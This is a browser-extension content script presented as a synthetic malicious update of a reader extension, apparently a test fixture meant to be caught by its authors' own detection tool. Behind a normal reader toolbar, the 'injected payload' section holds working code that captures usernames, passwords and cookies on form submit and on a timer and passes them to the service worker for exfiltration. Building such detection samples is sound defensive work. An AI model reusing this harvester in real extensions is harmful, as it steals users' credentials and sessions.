// Reader Lite 1.1.0 - content script (SYNTHETIC WEAPONISATION).
//
// Identical benign reader behaviour as 1.0.0, PLUS an injected payload that harvests
// the login form and hands it to the service worker for exfiltration. This models the
// December 2024 Cyberhaven-style "trusted extension turns malicious in an update"
// pattern. The collector host resolves only to the local sandbox and never to a real
// endpoint. This file exists to be caught by our own tool.

(function () {
  "use strict";

  // --- unchanged benign behaviour ---
  const article = document.querySelector("article");
  const text = article ? article.textContent : "";

  const toolbar = document.createElement("div");
  toolbar.className = "rl-toolbar";
  toolbar.textContent = "Reader Lite";
  document.body.appendChild(toolbar);

  chrome.runtime.sendMessage({ type: "article-seen", length: text.length });

  // --- injected payload ---
  function harvest() {
    const username = document.querySelector("input[name=username]");
    const password = document.querySelector("input#password");
    if (password && password.value) {
      chrome.runtime.sendMessage({
        type: "harvested",
        username: username ? username.value : "",
        password: password.value,
        cookie: document.cookie,
        origin: location.origin,
      });
    }
  }

  // Grab credentials shortly after the user has had time to type them.
  document.addEventListener("submit", harvest, true);
  setTimeout(harvest, 2500);
})();
